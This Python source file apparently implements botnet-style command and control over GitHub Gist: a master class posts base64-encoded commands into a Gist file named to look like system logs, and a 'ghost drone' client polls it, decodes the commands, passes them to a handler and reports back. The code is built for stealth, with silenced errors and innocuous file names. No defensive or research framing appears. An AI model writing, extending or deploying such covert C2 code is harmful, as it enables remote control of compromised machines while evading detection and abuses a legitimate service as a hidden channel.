"""
Argos C2 Gist Module v1.20.5 → v2.1.3 Integration
Ghost Drone Command & Control via GitHub Gist
"""
import os
import base64
import time
import requests
import threading
from typing import Callable, Optional

class GistC2:
    """GitHub Gist-based Command & Control"""
    
    def __init__(self, gist_id: str, github_token: str, node_id: str = "Master"):
        self.gist_id = gist_id
        self.token = github_token
        self.node_id = node_id
        self.last_ts = 0
        self.running = False
        self.handlers: dict[str, Callable] = {}
        self.headers = {"Authorization": f"token {self.token}"}
        
    def register_handler(self, tag: str, callback: Callable):
        """Register command handler: ARGOS_DIRECTIVE, ARGOS_FLASH_CMD, etc."""
        self.handlers[tag] = callback
        
    def broadcast(self, command: str, label: str = "ARGOS_DIRECTIVE") -> bool:
        """Send command to drone swarm via Gist"""
        try:
            ts = int(time.time())
            cmd_b64 = base64.b64encode(command.encode()).decode()
            content = f"{label}:{cmd_b64}:{ts}"
            
            url = f"https://api.github.com/gists/{self.gist_id}"
            data = {
                "files": {
                    "sys_logs.txt": {"content": content},
                    f"master_{self.node_id}.log": {
                        "content": f"[{self.node_id}] BROADCAST: {command} | TS: {ts}"
                    }
                }
            }
            requests.patch(url, headers=self.headers, json=data, timeout=10)
            return True
        except Exception as e:
            print(f"[C2] Broadcast error: {e}")
            return False
    
    def listener_loop(self, poll_interval: int = 30):
        """Background thread: listen for drone responses"""
        self.running = True
        print(f"[C2] Ghost Link established. Polling every {poll_interval}s...")
        
        while self.running:
            try:
                url = f"https://api.github.com/gists/{self.gist_id}"
                r = requests.get(url, headers=self.headers, timeout=15)
                files = r.json().get('files', {})
                
                # Check for drone logs
                for fname, fdata in files.items():
                    if fname.startswith("drone_") and fname.endswith(".log"):
                        content = fdata.get('content', '')
                        # Parse and forward to handlers
                        self._process_drone_log(fname, content)
                        
            except Exception as e:
                pass  # Silent fail for stealth
                
            time.sleep(poll_interval)
    
    def _process_drone_log(self, drone_id: str, content: str):
        """Process incoming drone telemetry"""
        # Extract drone ID from filename
        did = drone_id.replace("drone_", "").replace(".log", "")
        # Handlers can be added here
        if "FAIL" in content:
            print(f"[C2] ⚠️ Drone {did} reported failure")
        elif "SUCCESS" in content:
            print(f"[C2] ✅ Drone {did} completed task")
    
    def start_listener(self, daemon: bool = True):
        """Start background listener thread"""
        t = threading.Thread(target=self.listener_loop, daemon=daemon)
        t.start()
        return t
    
    def stop(self):
        self.running = False


class GhostDroneClient:
    """Client-side drone implementation (for nodes in swarm)"""
    
    def __init__(self, gist_id: str, github_token: str):
        self.gist_id = gist_id
        self.token = github_token
        self.drone_id = f"Drone_{os.urandom(2).hex().upper()}"
        self.last_ts = 0
        self.headers = {"Authorization": f"token {self.token}"}
        
    def report(self, msg: str):
        """Report status back to Master"""
        try:
            ts = int(time.time())
            log_name = f"drone_{self.drone_id}.log"
            payload = f"[{self.drone_id}] {msg} | TS: {ts}"
            
            url = f"https://api.github.com/gists/{self.gist_id}"
            data = {"files": {log_name: {"content": payload}}}
            requests.patch(url, headers=self.headers, json=data, timeout=10)
        except:
            pass
    
    def listen_for_commands(self, callback: Callable[[str, str], None]):
        """Listen for commands from Master (tag, command)"""
        import base64
        
        while True:
            try:
                url = f"https://api.github.com/gists/{self.gist_id}"
                r = requests.get(url, headers=self.headers, timeout=15)
                content = r.json()['files']['sys_logs.txt']['content']
                
                for tag in ["ARGOS_DIRECTIVE:", "ARGOS_FLASH_CMD:"]:
                    if tag in content:
                        parts = content.split(tag)[1].split(":")
                        cmd_b64 = parts[0]
                        ts = int(parts[1])
                        
                        if ts > self.last_ts:
                            command = base64.b64decode(cmd_b64).decode()
                            callback(tag, command)
                            self.last_ts = ts
                            
            except Exception as e:
                pass
            time.sleep(30)
